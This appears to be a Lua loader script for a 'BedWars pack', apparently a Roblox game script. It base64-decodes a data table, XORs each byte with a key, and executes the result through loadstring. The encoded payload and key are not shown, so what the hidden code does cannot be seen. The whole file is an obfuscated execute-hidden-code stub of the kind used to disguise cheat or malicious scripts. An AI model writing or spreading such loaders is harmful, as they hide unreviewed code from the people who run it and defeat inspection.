local function join(t)
	local s = ""
	for i = 1, #t do
		s = s .. t[i]
	end
	return s
end
local function b64decode(data)
	local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	data = string.gsub(data, "[^" .. b .. "=]", "")
	return (
		data:gsub(".", function(x)
			if x == "=" then
				return ""
			end
			local r, f = "", (b:find(x) - 1)
			for i = 6, 1, -1 do
				r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and "1" or "0")
			end
			return r
		end)
		:gsub("%d%d%d?%d?%d?%d?%d?%d?", function(x)
			if #x ~= 8 then
				return ""
			end
			local c = 0
			for i = 1, 8 do
				c = c + (x:sub(i, i) == "1" and 2 ^ (8 - i) or 0)
			end
			return string.char(c)
		end)
	)
end
local function bxor(a, b)
	if bit32 and bit32.bxor then
		return bit32.bxor(a, b)
	end
	if bit and bit.bxor then
		return bit.bxor(a, b)
	end
	local r, bitv = 0, 1
	while a > 0 or b > 0 do
		local abit, bbit = a % 2, b % 2
		if abit ~= bbit then
			r = r + bitv
		end
		a, b, bitv = (a - abit) / 2, (b - bbit) / 2, bitv * 2
	end
	return r
end
local enc = b64decode(join(C))
local out = {}
for i = 1, #enc do
	out[i] = string.char(bxor(string.byte(enc, i), K))
end
local src = table.concat(out)
local fn, err = loadstring(src)
if not fn then error("BedWars pack failed: " .. tostring(err)) end
fn()
